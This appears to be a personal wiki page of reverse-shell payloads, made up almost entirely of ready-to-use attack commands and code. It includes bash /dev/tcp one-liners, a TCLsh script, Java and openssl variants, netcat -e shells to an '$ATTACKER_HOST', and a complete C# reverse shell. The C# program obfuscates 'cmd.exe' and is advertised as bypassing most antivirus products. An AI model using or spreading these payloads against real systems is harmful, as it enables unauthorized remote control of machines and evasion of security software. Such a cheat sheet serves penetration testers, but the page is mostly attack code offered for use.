---
title: "Reverse shells"
slug: "reverse-shells"
priority: 4
editor: "markdown"
revisionCount: 2
id: 73
createdAt: "2022-09-23T23:30:18Z"
createdBy: "mxrch"
updatedAt: "2022-09-23T23:34:22Z"
updatedBy: "mxrch"
ownedBy: "mxrch"
views: 3
---
<h3 id="bkmrk-listener">Listener</h3>
<p id="bkmrk-avant-tout-reverse-s">Before any reverse shell, you need to set up the listener, which will listen to a port and receive connections :</p>
<pre id="bkmrk-nc--lvvp-%3Cport%3E"><code class="language-shell">nc -lvvp &lt;PORT&gt;</code></pre>
<hr id="bkmrk-"><h3 id="bkmrk-bash">Bash</h3>
<p id="bkmrk-en-udp-%3A">In TCP :</p>
<pre id="bkmrk-bash--i-%3E%26-%2Fdev%2Ftcp%2F"><code class="language-shell">bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1

exec 5&lt;&gt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done

exec /bin/sh 0&lt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 1&gt;&amp;0 2&gt;&amp;0

0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></pre>
<p id="bkmrk-%C2%A0"> </p>
<h3 id="bkmrk-tclsh">TCLsh</h3>
<pre id="bkmrk-%23%21%2Fusr%2Fbin%2Ftclsh-set"><code class="language-shell">#!/usr/bin/tclsh
set s [socket &lt;IP&gt; &lt;PORT&gt;];
while {42} {
puts -nonewline $s "shell&gt;";
flush $s;
gets $s c;
set e "exec $c";
if {![catch {set r [eval $e]} err]} {
puts $s $r;
}
flush $s;
}
close $s;</code></pre>
<p id="bkmrk-version-one-liner-%3A">One-liner version :</p>
<pre id="bkmrk-echo-%27set-s-%5Bsocket-"><code class="language-shell">echo 'set s [socket &lt;IP&gt; &lt;PORT&gt;];while 42 { puts -nonewline $s "shell&gt;";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh</code></pre>
<p id="bkmrk-%C2%A0-0"> </p>
<p id="bkmrk-%C2%A0-1"> </p>
<h3 id="bkmrk-java">Java</h3>
<pre id="bkmrk-r-%3D-runtime.getrunti"><code class="language-java">r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt; &gt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;;cat &lt;&amp; 5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()</code></pre>
<p id="bkmrk-%C2%A0-2"> </p>
<h3 id="bkmrk-on-pwn%27d-client">On PWN'd Client</h3>
<pre id="bkmrk-mkfifo-%2Ftmp%2Fs%3B-%2Fbin%2F"><code class="language-bash">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s</code></pre>
<p id="bkmrk-%C2%A0-3"> </p>
<h3 id="bkmrk-c%23">C#</h3>
<p id="bkmrk-%C2%A0-4">This is a simple C# source code to bypass almost "all" AVs (kaspersky v19, Eset v12 v13, Trend-Micro v16, Comodo and Windows Defender bypassed via this very simple method)</p>
<pre id="bkmrk-step-1-%28linux-side%3A1"><code class="language-">Step 1 (Linux Side:192.168.56.1)   : nc -l -p 443 

Step 2 (Windows Side:192.168.56.x) : NativePayload_ReverseShell.exe 192.168.56.1 443 </code></pre>
<pre id="bkmrk-using-system%3B-using-"><code class="language-C#">using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Diagnostics;

namespace NativePayload_ReverseShell
{
    class Program
    {
        public static StringBuilder _Liger = new StringBuilder();
        private static StreamWriter _LionTiger;
        static void Main(string[] args)
        {
	    //// Step 1 (linux Side:192.168.56.1)   : nc -l -p 443 
	    //// Step 2 (Windows Side:192.168.56.x) : NativePayload_ReverseShell.exe 192.168.56.1 443 

 	    Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_ReverseShell , Published by Damon Mohammadbagher , 2018");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_ReverseShell , C# Managed Shell Code (Reverse Shell)");
            Console.WriteLine();

            try
            {
                using (TcpClient Simple = new TcpClient(args[0].ToString(), Convert.ToInt32(args[1])))
                {
                    Thread.Sleep(1100);
                    using (Stream Very = Simple.GetStream())
                    {
                        using (StreamReader OoPS = new StreamReader(Very))
                        {
                            _LionTiger = new StreamWriter(Very);
                            Process _Tiger = new Process();
                            Thread.Sleep(3300);
                            _Tiger.StartInfo.FileName = Convert.ToString("0123456789CmD" + "." + "e" + "XE l;X E f k X  E sgkf;sk X  E f s ; xefs;s").Substring(10, 8);
                            _Tiger.StartInfo.CreateNoWindow = true;
                            _Tiger.StartInfo.UseShellExecute = false;
                            _Tiger.OutputDataReceived += _OutputDataReceived;
                            _Tiger.StartInfo.RedirectStandardOutput = true;
                            _Tiger.StartInfo.RedirectStandardInput = true;
                            _Tiger.StartInfo.RedirectStandardError = true;
                            _Tiger.Start();
                            _Tiger.BeginOutputReadLine();
                            while (true)
                            {
                                Thread.Sleep(3000);
                                _Liger.Append(OoPS.ReadLine());
                                _Tiger.StandardInput.WriteLine(_Liger);
                                _Liger.Remove(0, _Liger.Length);
                            }
                        }
                    }

                }
            }
            catch (Exception) {  }
        }

        private static void _OutputDataReceived(object sender, DataReceivedEventArgs echo)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(echo.Data))
            {
                try
                {
                    strOutput.Append(echo.Data);
                    _LionTiger.WriteLine(strOutput);
                    _LionTiger.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}</code></pre>
<p id="bkmrk-%C2%A0-7"> </p>
<h2 id="bkmrk-reverse-powershell" class="ho hp ap by bx hq hr hs ht hu hv hw hx hy hz ia ib" data-selectable-paragraph="">Reverse Powershell</h2>
<pre id="bkmrk-%2332bit-nc.exe-%24attac"><code class="language-">#32bit
nc.exe $ATTACKER_HOST $ATTACKER_PORT -e powershell

#64bit
nc64.exe $ATTACKER_HOST $ATTACKER_PORT -e powershell</code></pre>
<h2 id="bkmrk-reverse-windows" class="ho hp ap by bx hq hr hs ht hu hv hw hx hy hz ia ib" data-selectable-paragraph="">Reverse Windows</h2>
<pre id="bkmrk-%2332bit-nc.exe-%24attac-0"><code class="language-">#32bit
nc.exe $ATTACKER_HOST $ATTACKER_PORT -e cmd
#64bit
nc64.exe $ATTACKER_HOST $ATTACKER_PORT -e cmd</code></pre>
<h2 id="bkmrk-bind-powershell" class="ho hp ap by bx hq hr hs ht hu hv hw hx hy hz ia ib" data-selectable-paragraph="">Bind Powershell</h2>
<pre id="bkmrk-%2332bit-nc.exe--l--p-"><code class="language-windows">#32bit
nc.exe -l -p $LISTENPORT -e powershell
#64bit
nc64.exe -l -p $LISTENPORT -e powershell</code></pre>
<p id="bkmrk-%C2%A0-5"> </p>
